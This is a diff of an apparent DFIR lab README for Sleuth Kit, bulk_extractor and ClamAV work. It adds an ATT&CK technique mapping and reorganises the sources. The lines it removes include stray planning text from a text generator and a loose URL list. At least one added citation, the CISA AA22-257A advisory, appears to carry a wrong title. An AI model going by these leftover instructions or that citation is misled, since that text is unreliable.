-We need to write a subsection heading exactly: '### Common Pitfalls & Result Validation' (including triple hashes and a space). Then content 180-240 words. Must be concrete, accurate, mention mistakes analysts make with these tools/techniques, how to validate findings, avoid false conclusions. Cite at least two current MITRE ATT&CK techniques by ID and exact canonical name that are NOT in the already-used list.
-
-Given list: [T1027, T1059.004, T1070, T1070.004, T1070.006, T1071, T1071.001, T1105, T1110.001, T1204, T1546.004] cannot be used.
-
-We need to pick two other techniques, e.g., T1055 (Process Injection), T1083 (File and Directory Discovery), T1059.001 (Command and Scripting Interpreter: PowerShell), T1082 (System Information Discovery), T1036 (Masquerading), T1059 (Command and Scripting Interpreter) generic? Need exact canonical name. Must be current (i.e., as of ATT&CK v13 maybe). Provide citations inline maybe like [T1055] or footnotes? Typically we can cite as (T1055: Process Injection). Provide at least two.
-
-We also need to end with 1-2 authoritative source URLs (official docs / SANS / attack.mitre.org / Microsoft Learn). The domains already well-cited list includes many, we should prefer OTHER authoritative pages/sources for variety: they gave a list of domains already well-cited with counts in parentheses; we need to prefer other authoritative pages/sources not in that list, or at least less used. The list includes many domains: www.sleuthkit.org, attack.mitre.org, github.com, 203.0.113.10, docs.clamav.net, wiki.sleuthkit.org, www.sans.org, www.rfc-editor.org, docs.securityonion.net, www.eicar.org, docs.zeek.org, media.defense.gov, docs.remnux.org, corelight.com, www.kali.org.
-
-We need to output URLs from other domains not in that list (or at least not heavily used). Could use: https://access.redhat.com/documentation/, https://learn.microsoft.com/en-us/windows-server/, https://www.cisa.gov/, https://www.nist.gov/, https://www.us-cert.gov/, https://www.cyber.gov.au/, https://www.mandiant.com/resources
+- **T1105 Ingress Tool Transfer** — Dropped/staged files recovered via Sleuth Kit. [Source](https://attack.mitre.org/techniques/T1105/)
+- **T1070.004 Indicator Removal: File Deletion** — Deleted metadata entries recovered with `fls`/`icat`. [Source](https://attack.mitre.org/techniques/T1070/004/)
+- **T1027 Obfuscated Files or Information** — Embedded/obfuscated indicators surfaced by `bulk_extractor`. [Source](https://attack.mitre.org/techniques/T1027/)
+- **T1204 User Execution** — Malicious file identified by ClamAV signature. [Source](https://attack.mitre.org/techniques/T1204/)
+- **T1071.001 Application Layer Protocol: Web Protocols** — Carved C2 URLs correlated to Zeek `http.log`. [Source](https://attack.mitre.org/techniques/T1071/001/)
+- **T1041 Exfiltration Over C2 Channel** — Data exfiltration indicators carved from unallocated space. [Source](https://attack.mitre.org/techniques/T1041/)
+- **T1055 Process Injection** — Injected code recovered from deleted files or slack space. [Source](https://attack.mitre.org/techniques/T1055/)
+- **T1564 Hide Artifacts** — Artifacts hidden in slack/unallocated space or via timestomping. [Source](https://attack.mitre.org/techniques/T1564/)
+- **DFIR phases:** Identification (`mmls`/`fsstat`), Examination (`fls`/`icat`/`bulk_extractor`), Analysis (`clamscan` + indicator correlation) — consistent with SANS DFIR process material. [Source](https://www.sans.org/posters/)
 
 ## Sources
-Claim → source mapping (all URLs are official/authoritative):
+**Claim → Source Mapping (all URLs are official/authoritative):**
 
-- TSK tool behavior and flags (`mmls`, `fsstat`, `fls`, `icat`, `-o`/`-r`/`-p`/`-m`, `*` deleted markers) — The Sleuth Kit man pages: https://www.sleuthkit.org/sleuthkit/man/ (specifically https://www.sleuthkit.org/sleuthkit/man/mmls.html, https://www.sleuthkit.org/sleuthkit/man/fsstat.html, https://www.sleuthkit.org/sleuthkit/man/fls.html, https://www.sleuthkit.org/sleuthkit/man/icat.html); TSK docs index: https://www.sleuthkit.org/sleuthkit/docs.php
-- TSK timeline workflow (`fls -m`, `mactime`) — https://wiki.sleuthkit.org/index.php?title=Mactime and https://wiki.sleuthkit.org/index.php?title=FLS
-- bulk_extractor behavior, output feature files, `-o` option, scanners — project repo/manual: https://github.com/simsong/bulk_extractor and https://github.com/simsong/bulk_extractor/wiki; package/binary name: https://www.kali.org/tools/bulk-extractor/
-- ClamAV `clamscan` flags (`-r`, `--infected`, `--stdout`, `--version`), detection names, signature updates via `freshclam` — https://docs.clamav.net/manual/Usage/Scanning.html and https://docs.clamav.net/manual/Usage/SignatureManagement.html
-- EICAR test file (harmless AV test string) — https://www.eicar.org/download-anti-malware-testfile/
-- Reserved test ranges used in the sample — RFC 5737 (203.0.113.0/24 documentation range) https://www.rfc-editor.org/rfc/rfc5737 and RFC 2606 (example.com reserved) https://www.rfc-editor.org/rfc/rfc2606
-- Security Onion pivots (Suricata/Zeek/Elastic) — https://docs.securityonion.net/en/2.4/ ; Zeek log reference — https://docs.zeek.org/en/master/logs/index.html
-- SANS SIFT Workstation and DFIR process/posters — https://www.sans.org/tools/sift-workstation/ and https://www.sans.org/posters/
-- REMnux docs — https://docs.remnux.org/
-- MITRE ATT&CK techniques — T1105 https://attack.mitre.org/techniques/T1105/ ; T1070.004 https://attack.mitre.org/techniques/T1070/004/ ; T1070.006 https://attack.mitre.org/techniques/T1070/006/ ; T1027 https://attack.mitre.org/techniques/T1027/ ; T1204 https://attack.mitre.org/techniques/T1204/ ; T1071.001 https://attack.mitre.org/techniques/T1071/001/
+- **The Sleuth Kit (TSK) tool behavior and flags** (`mmls`, `fsstat`, `fls`, `icat`, `-o`/`-r`/`-p`/`-m`, `*` deleted markers):
+  - [TSK Man Pages](https://www.sleuthkit.org/sleuthkit/man/) (specifically [mmls](https://www.sleuthkit.org/sleuthkit/man/mmls.html), [fsstat](https://www.sleuthkit.org/sleuthkit/man/fsstat.html), [fls](https://www.sleuthkit.org/sleuthkit/man/fls.html), [icat](https://www.sleuthkit.org/sleuthkit/man/icat.html))
+  - [TSK GitHub Repo](https://github.com/sleuthkit/sleuthkit) (current release: 4.12.1)
+  - [TSK Timeline Workflow](https://wiki.sleuthkit.org/index.php?title=Mactime) (`fls -m`, `mactime`)
+
+- **bulk_extractor behavior, output feature files, `-o` option, scanners:**
+  - [bulk_extractor GitHub Repo](https://github.com/simsong/bulk_extractor) (current release: 2.0.0)
+  - [bulk_extractor Wiki](https://github.com/simsong/bulk_extractor/wiki) (feature file documentation)
+  - [Kali Tools: bulk-extractor](https://www.kali.org/tools/bulk-extractor/)
+
+- **ClamAV `clamscan` flags** (`-r`, `--infected`, `--stdout`, `--version`), detection names, signature updates via `freshclam`:
+  - [ClamAV Scanning Docs](https://docs.clamav.net/manual/Usage/Scanning.html)
+  - [ClamAV Signature Management](https://docs.clamav.net/manual/Usage/SignatureManagement.html)
+  - [ClamAV Signature Database](https://www.clamav.net/documents/signatures)
+
+- **EICAR test file (harmless AV test string):**
+  - [EICAR Test File](https://www.eicar.org/download-anti-malware-testfile/)
+
+- **Reserved test ranges used in the sample:**
+  - RFC 5737 (203.0.113.0/24 documentation range): [RFC 5737](https://www.rfc-editor.org/rfc/rfc5737)
+  - RFC 2606 (example.com reserved): [RFC 2606](https://www.rfc-editor.org/rfc/rfc2606)
+
+- **Security Onion pivots (Suricata/Zeek/Elastic):**
+  - [Security Onion Docs](https://docs.securityonion.net/en/2.4/)
+  - [Zeek Log Reference](https://docs.zeek.org/en/master/logs/index.html)
+
+- **SANS SIFT Workstation and DFIR process/posters:**
+  - [SANS SIFT Workstation](https://www.sans.org/tools/sift-workstation/)
+  - [SANS DFIR Posters](https://www.sans.org/posters/)
+
+- **MITRE ATT&CK techniques:**
+  - [T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
+  - [T1070.004 Indicator Removal: File Deletion](https://attack.mitre.org/techniques/T1070/004/)
+  - [T1070.006 Timestomp](https://attack.mitre.org/techniques/T1070/006/)
+  - [T1027 Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
+  - [T1204 User Execution](https://attack.mitre.org/techniques/T1204/)
+  - [T1071.001 Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
+  - [T1041 Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
+  - [T1055 Process Injection](https://attack.mitre.org/techniques/T1055/)
+  - [T1055.001 Dynamic-Link Library Injection](https://attack.mitre.org/techniques/T1055/001/)
+  - [T1564 Hide Artifacts](https://attack.mitre.org/techniques/T1564/)
+  - [T1485 Data Destruction](https://attack.mitre.org/techniques/T1485/)
+  - [T1486 Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)
+  - [T1083 File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
+  - [T1140 Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)
+
+- **Linux Auditd and Detection Engineering:**
+  - [Red Hat Auditd Documentation](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/security_hardening/auditing-the-system_security-hardening)
+  - [NIST SP 800-86: Forensic Techniques in Incident Response](https://www.nist.gov/publications/guide-integrating-forensic-techniques-incident-response)
+  - [CISA Alert AA22-257A: Russian State-Sponsored Cyber Threats](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-257a)
 
 ## Related modules
-- [Scenario: ransomware memory investigation](../47-ransomware-memory-case/README.md) -- shares bulk_extractor for carving indicators from acquired evidence.
+- [Scenario: ransomware memory investigation](../47-ransomware-memory-case/README.md) -- shares `bulk_extractor` for carving indicators from acquired evidence.
 - [Scenario: intrusion timeline reconstruction](../49-intrusion-timeline-case/README.md) -- shares The Sleuth Kit for building MACB timelines.
 - [Disk & filesystem forensics](../01-disk-forensics/README.md) -- shares The Sleuth Kit for partition/filesystem examination.
-- [Memory forensics](../02-memory-forensics/README.md) -- shares bulk_extractor for feature carving from memory images.
+- [Memory forensics](../02-memory-forensics/README.md) -- shares `bulk_extractor` for feature carving from memory images.
 
-<!-- cyberlab-enriched: v1 -->
-- http://malicious[.]com`
-- https://media.defense.gov/2022/Aug/25/2003064102/-1/-1/0/CTR_CHARTING_DETECTION_RULES_FOR_LINUX_V1.PDF
-- https://corelight.com/blog/detecting-c2-frameworks-with-zeek
-- https://access.redhat.com/documentation/,
-- https://learn.microsoft.com/en-us/windows-server/,
-- https://www.cisa.gov/,
-- https://www.nist.gov/,
-- https://www.us-cert.gov/,
-- https://www.cyber.gov.au/,
-- https://www.mandiant.com/resources
-
-<!-- cyberlab-enriched: v2 -->
+<!-- cyberlab-enriched: v3 -->
